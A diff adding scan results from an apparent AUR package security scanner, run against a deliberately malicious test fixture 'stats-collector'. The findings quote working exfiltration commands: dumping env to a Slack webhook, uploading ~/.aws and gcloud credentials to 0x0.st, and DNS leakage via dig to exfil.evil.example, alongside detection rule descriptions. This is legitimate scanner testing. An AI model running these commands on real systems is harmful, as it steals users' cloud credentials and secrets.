@@ -1,0 +1,83 @@
+
+Scan Results: stats-collector
+============================================================
+
+[CRITICAL] INSTALL-003 Network access in install script (install script)
+    Install scripts should not make network connections
+    Location: /home/hippy/KS/projects/aur-security-scanner/tests/fixtures/malicious/exfil-channels/stats-collector.install:2
+    Code:   env | curl --data-binary @- https://hooks.slack.com/services/T0/B0/xxxx
+    Recommendation: Install scripts should never download additional content
+    Reference: CWE-494
+
+[CRITICAL] INSTALL-003 Network access in install script (install script)
+    Install scripts should not make network connections
+    Location: /home/hippy/KS/projects/aur-security-scanner/tests/fixtures/malicious/exfil-channels/stats-collector.install:4
+    Code:   tar czf - ~/.aws ~/.config/gcloud | curl --upload-file - https://0x0.st
+    Recommendation: Install scripts should never download additional content
+    Reference: CWE-494
+
+[CRITICAL] EXFIL-001 Curl POST data exfiltration (install script)
+    Sending data to external servers via curl POST
+    Location: /home/hippy/KS/projects/aur-security-scanner/tests/fixtures/malicious/exfil-channels/stats-collector.install:2
+    Code:   env | curl --data-binary @- https://hooks.slack.com/services/T0/B0/xxxx
+    Recommendation: Build/install should not send data externally
+    Reference: CWE-200
+
+[CRITICAL] EXFIL-004 DNS exfiltration (install script)
+    Data smuggled out via DNS lookups (dig/nslookup/host of a command-substituted subdomain, or a TXT query to an attacker domain).
+    Location: /home/hippy/KS/projects/aur-security-scanner/tests/fixtures/malicious/exfil-channels/stats-collector.install:3
+    Code:   dig +short "$(whoami).$(hostname).exfil.evil.example"
+    Recommendation: Review the destination domain; this pattern smuggles data over DNS.
+    Reference: CWE-200
+
+[CRITICAL] EXFIL-008 Slack/Teams webhook exfiltration (install script)
+    Posting to a Slack or Microsoft Teams incoming webhook — a common low-friction exfil/C2 channel.
+    Location: /home/hippy/KS/projects/aur-security-scanner/tests/fixtures/malicious/exfil-channels/stats-collector.install:2
+    Code:   env | curl --data-binary @- https://hooks.slack.com/services/T0/B0/xxxx
+    Recommendation: Remove. Packages do not post to chat webhooks during build/install.
+    Reference: CWE-200
+
+[HIGH] HIDDEN-001 Hidden file creation in home (install script)
+    Creating hidden files in user home directory
+    Location: /home/hippy/KS/projects/aur-security-scanner/tests/fixtures/malicious/exfil-channels/stats-collector.install:4
+    Code:   tar czf - ~/.aws ~/.config/gcloud | curl --upload-file - https://0x0.st
+    Recommendation: Packages should not create hidden files in user home
+
+[HIGH] EXFIL-006 HTTP upload exfiltration (install script)
+    curl uploading a local file (-T/--upload-file/-F/--data-urlencode) — used to send harvested data to an attacker endpoint.
+    Location: /home/hippy/KS/projects/aur-security-scanner/tests/fixtures/malicious/exfil-channels/stats-collector.install:4
+    Code:   tar czf - ~/.aws ~/.config/gcloud | curl --upload-file - https://0x0.st
+    Recommendation: Verify what is being uploaded and to where.
+    Reference: CWE-200
+
+[HIGH] EXFIL-009 Anonymous file-drop / tunnel host (install script)
+    Uploads to a throwaway file-drop or tunnels through ngrok/webhook.site/requestbin/IPFS — exfil and ad-hoc C2 endpoints.
+    Location: /home/hippy/KS/projects/aur-security-scanner/tests/fixtures/malicious/exfil-channels/stats-collector.install:4
+    Code:   tar czf - ~/.aws ~/.config/gcloud | curl --upload-file - https://0x0.st
+    Recommendation: Review the destination; these are common exfil/C2 hosts.
+    Reference: CWE-200
+
+[HIGH] CRED-008 Environment/secret dump (install script)
+    Dumping the environment (env/printenv) to a file or pipe to curl/nc/base64 — harvests tokens and secrets exposed as env vars.
+    Location: /home/hippy/KS/projects/aur-security-scanner/tests/fixtures/malicious/exfil-channels/stats-collector.install:2
+    Code:   env | curl --data-binary @- https://hooks.slack.com/services/T0/B0/xxxx
+    Recommendation: Remove. Packages have no reason to dump the environment.
+    Reference: CWE-522
+
+[HIGH] CRED-004 Cloud / CI credential file access (install script)
+    Reads cloud or CI credential files (gcloud, docker config, npmrc, pypirc, cargo/terraform credentials, git-credentials).
+    Location: /home/hippy/KS/projects/aur-security-scanner/tests/fixtures/malicious/exfil-channels/stats-collector.install:4
+    Code:   tar czf - ~/.aws ~/.config/gcloud | curl --upload-file - https://0x0.st
+    Recommendation: Verify why a build/install touches credential files.
+    Reference: CWE-522
+
+
+
+============================================================
+Package: stats-collector v1.0.0-1
+Scan duration: 2ms
+
+Found 10 issue(s):
+  5 CRITICAL
+  5 HIGH
+============================================================
